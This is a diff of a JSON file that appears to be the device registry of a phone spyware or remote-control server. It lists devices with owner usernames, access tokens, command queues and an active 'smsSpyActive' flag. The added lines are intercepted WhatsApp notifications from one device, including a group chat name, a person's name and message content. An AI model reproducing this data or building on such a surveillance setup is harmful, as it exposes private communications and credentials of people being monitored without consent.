@@ -4,7 +4,7 @@
     "deviceName": "HP-LOCK-236E",
     "ownerUsername": "Riz99",
     "token": "beb4680df9d0c4760e888ab7befb5c20",
-    "lastSeen": 1775817869981,
+    "lastSeen": 1775817882109,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-10T07:13:35.169Z",
@@ -116,7 +116,7 @@
     "deviceName": "HP-DDD-6DEF",
     "ownerUsername": "kamu cii",
     "token": "246f790ea49ac7f86fc663e710b7b286",
-    "lastSeen": 1775817867964,
+    "lastSeen": 1775817880113,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-10T10:06:23.436Z",
@@ -132,6 +132,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎86 pesan dari 4 chat",
+        "time": "10/04 18:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775817882589
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (5 pesan): ~ ST.AISYAH.S",
+        "content": "😁🥰🥰🥰",
+        "time": "10/04 18:44",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775817882143
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
